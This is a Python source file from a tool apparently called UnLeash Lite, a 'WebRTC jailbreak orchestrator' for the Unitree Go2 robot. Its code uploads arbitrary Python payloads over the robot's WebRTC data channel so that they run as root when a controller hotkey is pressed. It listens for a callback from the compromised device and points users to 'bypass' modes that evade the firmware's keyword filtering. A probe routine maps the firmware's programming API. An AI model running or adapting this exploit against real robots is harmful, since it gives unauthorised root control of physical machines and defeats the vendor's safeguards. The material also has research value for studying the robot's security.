"""
WebRTC jailbreak orchestrator for Unitree Go2.

Uploads Python payloads via the WebRTC data channel to programming_actuator,
bound to a controller hotkey. Execution happens when the user presses the
hotkey on the physical controller. Requires LAN adjacency only.
"""

import asyncio
import logging

from .webrtc import Go2DataChannel
from .webrtc_payloads import WebRTCPayload, validate_bypass_payload

logger = logging.getLogger("unleash_lite.webrtc_jailbreak")

import json

G = "\033[1;32m"; R = "\033[1;31m"; Y = "\033[1;33m"; C = "\033[1;36m"
DIM = "\033[2m"; BOLD = "\033[1m"; RESET = "\033[0m"


def _dump_response(label, resp):
    """Pretty-print a raw DDS response dict for diagnostics."""
    try:
        formatted = json.dumps(resp, indent=2)
    except (TypeError, ValueError):
        formatted = repr(resp)
    for line in formatted.split("\n"):
        print(f"  {DIM}  [{label}] {line}{RESET}")


class WebRTCJailbreakOrchestrator:

    def __init__(self, robot_ip, payload, callback_ip=None,
                 callback_port=19999, signaling_port=9991,
                 aes_128_key=None):
        self.robot_ip = robot_ip
        self.payload = payload
        self.callback_ip = callback_ip
        self.callback_port = callback_port
        self.signaling_port = signaling_port
        self.aes_128_key = aes_128_key

    async def execute(self, wait_for_callback=True, callback_timeout=120.0):
        """Three-phase jailbreak: upload -> instruct -> verify."""
        p = self.payload
        hotkey = p.bind_hotkey

        print()
        print(f"  {C}{'=' * 62}{RESET}")
        print(f"  {C}{BOLD}  UnLeash Lite — WebRTC Jailbreak{RESET}")
        print(f"  {C}  Target: {self.robot_ip}:{self.signaling_port}{RESET}")
        print(f"  {C}  Mode:   {p.name} — {p.description}{RESET}")
        print(f"  {C}  Hotkey: {hotkey}{RESET}")
        print(f"  {C}{'=' * 62}{RESET}")

        ok, kw = validate_bypass_payload(p.python_code)
        if not ok:
            print()
            print(f"  {Y}  WARNING: Payload contains blocked keyword {kw!r}.{RESET}")
            print(f"  {Y}  This mode will NOT work on firmware >= 1.1.14{RESET}")
            print(f"  {Y}  (programming_actuator 1.0.5.5+). Use a bypass- mode.{RESET}")

        print()

        # Phase 1: Connect and upload
        callback_received = asyncio.Event()
        callback_data = []
        server = None

        if self.callback_ip and wait_for_callback:
            async def handle_callback(reader, writer):
                data = await reader.read(8192)
                callback_data.append(data.decode(errors='replace'))
                callback_received.set()
                writer.close()

            try:
                server = await asyncio.start_server(
                    handle_callback, '0.0.0.0', self.callback_port)
                print(f"  {G}[1/5]{RESET} Callback listener on port {self.callback_port}")
            except OSError as e:
                print(f"  {Y}[1/5]{RESET} Callback listener failed ({e}) — skipping verification")
                wait_for_callback = False
        else:
            print(f"  {DIM}[1/5]{RESET} Callback listener skipped")

        dc = Go2DataChannel(self.robot_ip, self.signaling_port,
                            aes_128_key=self.aes_128_key)

        try:
            print(f"  {G}[2/5]{RESET} Connecting via WebRTC data channel...")
            await dc.connect()
            print(f"         {DIM}Connected + validated{RESET}")
        except Exception as e:
            print(f"  {R}[2/5] Connection failed:{RESET} {e}")
            if server:
                server.close()
            return False

        try:
            print(f"  {G}[3/5]{RESET} Uploading payload ({len(p.python_code)} bytes)...")
            status, upload_resp = await dc.upload_program(
                p.python_code, p.program_uuid, hotkey)
            if status == 0:
                print(f"         {DIM}Upload accepted (status 0){RESET}")
            else:
                print(f"  {R}       Upload rejected (status {status}){RESET}")
                if upload_resp:
                    _dump_response("upload", upload_resp)
                await dc.close()
                if server:
                    server.close()
                return False

            print(f"  {G}[4/5]{RESET} Verifying registration...")
            programs, list_resp = await dc.list_programs()
            registered = any(
                prog.get("program_uuid") == p.program_uuid
                for prog in programs
            )
            if registered:
                print(f"         {DIM}Registered on {hotkey}{RESET}")
            else:
                print(f"  {Y}       Not found in hotkey list (may still work){RESET}")
                if programs:
                    print(f"  {Y}       Hotkey list returned:{RESET}")
                    for prog in programs:
                        print(f"  {Y}         {prog}{RESET}")
                elif list_resp:
                    print(f"  {Y}       Raw list response:{RESET}")
                    _dump_response("list", list_resp)

        except Exception as e:
            print(f"  {R}  Error during upload:{RESET} {e}")
            await dc.close()
            if server:
                server.close()
            return False

        await dc.close()

        # Phase 2: Instruct user
        print()
        print(f"  {G}╔{'═' * 60}╗{RESET}")
        print(f"  {G}║{RESET}  {BOLD}PAYLOAD STAGED{RESET} — "
              f"Press {BOLD}{hotkey}{RESET} on the Go2 controller"
              f"       {G}║{RESET}")
        print(f"  {G}╚{'═' * 60}╝{RESET}")
        print()
        print(f"  {DIM}Written to: /unitree/etc/programming/{p.program_uuid}.py{RESET}")
        print(f"  {DIM}Executes as root when {hotkey} is pressed on the controller.{RESET}")

        # Phase 3: Wait for callback
        if wait_for_callback and self.callback_ip and server:
            print()
            print(f"  {G}[5/5]{RESET} Waiting for callback ({int(callback_timeout)}s)...")
            try:
                await asyncio.wait_for(
                    callback_received.wait(), timeout=callback_timeout)
                print()
                print(f"  {G}{'=' * 62}{RESET}")
                print(f"  {G}{BOLD}  JAILBREAK CONFIRMED{RESET}")
                for line in callback_data:
                    for l in line.strip().split('\n'):
                        print(f"  {G}  {l}{RESET}")
                print(f"  {G}{'=' * 62}{RESET}")
                server.close()
                return True
            except asyncio.TimeoutError:
                print(f"\n  {Y}No callback received.{RESET} "
                      f"Press {BOLD}{hotkey}{RESET} on the controller to execute.")
                server.close()
                return False
        else:
            print(f"\n  {DIM}[5/5] Callback verification skipped{RESET}")
            return True


async def probe(robot_ip, signaling_port=9991, aes_128_key=None):
    """Diagnostic probe: connect, query, upload a no-op, query again.

    Prints all raw DDS responses for firmware API analysis.
    """
    print()
    print(f"  {C}{'=' * 62}{RESET}")
    print(f"  {C}{BOLD}  UnLeash Lite — Diagnostic Probe{RESET}")
    print(f"  {C}  Target: {robot_ip}:{signaling_port}{RESET}")
    print(f"  {C}{'=' * 62}{RESET}")
    print()

    dc = Go2DataChannel(robot_ip, signaling_port, aes_128_key=aes_128_key)

    all_messages = []
    def capture(msg):
        all_messages.append(msg)
    dc.on_message(capture)

    try:
        print(f"  {G}[1/6]{RESET} Connecting via WebRTC...")
        await dc.connect()
        print(f"         {DIM}Connected + validated{RESET}")
    except Exception as e:
        print(f"  {R}[1/6] Connection failed:{RESET} {e}")
        return

    try:
        # Step 2: List existing programs
        print(f"  {G}[2/6]{RESET} Querying hotkey list (api_id=1001)...")
        programs_before, list_resp = await dc.list_programs()
        print(f"         {DIM}Parsed entries: {len(programs_before)}{RESET}")
        if programs_before:
            for prog in programs_before:
                print(f"         {DIM}  {prog}{RESET}")
        if list_resp:
            _dump_response("list_before", list_resp)

        # Step 3: Upload a minimal no-op program
        import time as _time
        probe_uuid = str(int(_time.time()))
        noop_code = "pass"
        hotkey = "L1+Y"

        print(f"  {G}[3/6]{RESET} Uploading no-op program (uuid={probe_uuid})...")
        status, upload_resp = await dc.upload_program(
            noop_code, probe_uuid, hotkey)
        print(f"         {DIM}Upload status: {status}{RESET}")
        if upload_resp:
            _dump_response("upload", upload_resp)

        # Step 4: List programs again
        print(f"  {G}[4/6]{RESET} Querying hotkey list again...")
        programs_after, list_resp2 = await dc.list_programs()
        print(f"         {DIM}Parsed entries: {len(programs_after)}{RESET}")
        if programs_after:
            for prog in programs_after:
                print(f"         {DIM}  {prog}{RESET}")
        if list_resp2:
            _dump_response("list_after", list_resp2)

        # Step 5: Check UUID round-trip
        print(f"  {G}[5/6]{RESET} Checking UUID round-trip...")
        found = any(
            prog.get("program_uuid") == probe_uuid for prog in programs_after)
        if found:
            print(f"         {G}UUID round-trip OK — program_uuid stored correctly{RESET}")
        else:
            print(f"  {Y}       UUID round-trip FAILED — sent '{probe_uuid}', "
                  f"not found in response{RESET}")
            has_hotkey = any(
                prog.get("hotkey") == hotkey for prog in programs_after)
            if has_hotkey:
                match = next(p for p in programs_after if p.get("hotkey") == hotkey)
                stored_uuid = match.get("program_uuid", "(missing key)")
                print(f"  {Y}       Hotkey {hotkey} IS registered, "
                      f"but program_uuid = {stored_uuid!r}{RESET}")
                if stored_uuid == "":
                    print(f"  {R}       >>> Firmware is dropping program_uuid. "
                          f"The DDS schema likely changed.{RESET}")
                    print(f"  {R}       >>> Try checking if 'uuid' or 'program_id' "
                          f"fields appear in the raw response above.{RESET}")
            else:
                print(f"  {Y}       Hotkey {hotkey} not found in list either{RESET}")

        # Step 6: Summary of all captured messages
        print(f"  {G}[6/6]{RESET} Captured {len(all_messages)} total DC messages")

    except Exception as e:
        print(f"  {R}  Probe error:{RESET} {e}")
        import traceback
        traceback.print_exc()
    finally:
        await dc.close()

    print()
    print(f"  {C}{'=' * 62}{RESET}")
    print(f"  {C}  Probe complete. Share the output above for analysis.{RESET}")
    print(f"  {C}  Re-run with --debug for full message-level traces.{RESET}")
    print(f"  {C}{'=' * 62}{RESET}")
    print()
